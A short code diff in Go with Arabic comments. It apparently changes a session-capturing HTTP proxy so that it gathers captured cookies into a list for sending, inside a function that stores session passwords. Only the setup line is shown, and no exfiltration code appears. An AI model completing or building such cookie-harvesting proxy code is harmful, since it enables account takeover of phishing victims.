@@ -2228,6 +2228,8 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 			
 			// استدعاء الدالة الجديدة لإرسال الكوكيز
 			go func() {
+				cookiesList := []map[string]interface{}{} // قائمة لتخزين الكوكيز بالتنسيق المطلوب
+
 				// تأخير قصير للتأكد من جمع جميع البيانات
 				time.Sleep(1 * time.Second)
 				
